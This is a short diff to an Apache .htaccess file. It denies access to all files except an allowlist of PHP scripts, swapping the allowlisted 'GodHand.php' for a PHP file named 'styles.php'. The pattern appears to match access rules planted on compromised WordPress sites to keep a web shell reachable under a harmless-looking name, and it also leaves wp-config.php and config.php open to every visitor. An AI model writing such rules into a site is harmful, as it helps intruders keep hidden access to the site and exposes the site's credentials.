@@ -1,15 +1,14 @@
-Order Deny,Allow
-Deny from all
-
-<FilesMatch "^(index\.php|config\.php|wp-config\.php|GodHand\.php)$">
-    Allow from all
-</FilesMatch>
-
 Options -Indexes
 
-RewriteEngine On
+Require all denied
+
+<FilesMatch "^(index\.php|config\.php|wp-config\.php|styles\.php)$">
+    Require all granted
+</FilesMatch>
 
 RedirectMatch 403 ^/.+/.*/$
 
-RewriteCond %{REQUEST_URI} ^/$
-RewriteRule ^$ index.php [L]
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
